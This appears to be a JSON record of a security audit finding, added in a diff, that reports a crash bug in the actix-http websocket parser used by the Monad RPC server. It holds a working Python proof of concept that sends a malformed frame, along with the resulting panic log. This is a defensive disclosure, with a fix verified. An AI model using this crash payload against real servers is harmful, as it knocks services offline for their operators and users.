@@ -1,0 +1,60 @@
+{
+    "id": 62908,
+    "kind": "PDF",
+    "auditfirm_id": 6,
+    "impact": "LOW",
+    "finders_count": 4,
+    "protocol_id": 3419,
+    "title": "RPC crash due to bug in Actix websocket parser",
+    "content": "## Severity: Low Risk\n\n## Context\n`websocket.rs#L4`\n\n## Description\nThe Monad RPC can optionally be configured to accept websocket connections. It uses the `actix-http` crate to serve websocket connections. This crate contains a bug in the websocket frame parser where a malformed frame can cause the code to panic. This is a previously undiscovered bug in Actix.\n\n```python\nimport socket\nimport base64\nimport hashlib\nimport struct\n\ndef send_malformed_websocket_frame(host, port, path=\"/\"):\n    WEBSOCKET_MAGIC = \"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\"\n    key = base64.b64encode(b\"test_key_1234567\").decode()\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((host, port))\n    try:\n        request = (\n            f\"GET {path} HTTP/1.1\\r\\n\"\n            f\"Host: {host}:{port}\\r\\n\"\n            f\"Connection: Upgrade \\r\\n\"\n            f\"Upgrade: websocket \\r\\n\"\n            f\"Sec-WebSocket-Key: {key}\\r\\n\"\n            f\"Sec-WebSocket-Version: 13 \\r\\n\"\n            f\"\\r\\n\"\n        )\n        sock.send(request.encode())\n        response = sock.recv(1024).decode()\n        if \"101 Switching Protocols \" not in response:\n            print(\"WebSocket upgrade failed! \")\n            return\n        malformed_frame = bytes([0x0a, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xeb,\n                                 0x0e, 0x8f])\n        sock.send(malformed_frame)\n    finally:\n        sock.close()\n\nHOST = \"localhost\"\nPORT = 8081\nPATH = \"/\"\nsend_malformed_websocket_frame(HOST, PORT, PATH)\n```\n\nThis stops the RPC server:\n\n```\nmonad_rpc-1 |\nmonad_rpc-1 | thread 'actix-server worker 1' panicked at\n'/root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/src/bytes_mut.rs:1153:9',\nmonad_rpc-1 | cannot advance past `remaining`: 18446744073709551615 <= 0\nmonad_rpc-1 | stack backtrace:\nmonad_rpc-1 | note: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.\nmonad_rpc-1 exited with code 134\n```\n\n## Recommendation\nReport the issue to Actix and upgrade to the fixed version.\n\n## Category Labs\nFixed in PR 2265.\n\n## Spearbit\nFix verified.",
+    "summary": "",
+    "report_date": "2025-09-19T00:00:00.000Z",
+    "contest_prize_txt": "",
+    "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Monad-Spearbit-Security-Review-September-2025.pdf",
+    "sponsor_name": null,
+    "sponsor_link": "",
+    "quality_score": 0,
+    "general_score": 0,
+    "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Monad-Spearbit-Security-Review-September-2025.pdf",
+    "github_link": "",
+    "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/Monad-Spearbit-Security-Review-September-2025.pdf",
+    "pdf_page_from": 40,
+    "contest_id": "",
+    "slug": "rpc-crash-due-to-bug-in-actix-websocket-parser-spearbit-none-monad-pdf",
+    "firm_name": "Spearbit",
+    "firm_logo_square": "spearbit_square.png",
+    "protocol_name": "Monad",
+    "bookmarked": false,
+    "read": false,
+    "issues_issue_finders": [
+        {
+            "wardens_warden": {
+                "handle": "Haxatron"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "Dtheo"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "Guido Vranken"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "Rikard Hjort"
+            }
+        }
+    ],
+    "auditfirms_auditfirm": {
+        "name": "Spearbit",
+        "logo_square": "spearbit_square.png"
+    },
+    "protocols_protocol": {
+        "name": "Monad",
+        "protocols_protocolcategoryscore": []
+    },
+    "issues_issuetagscore": []
+}
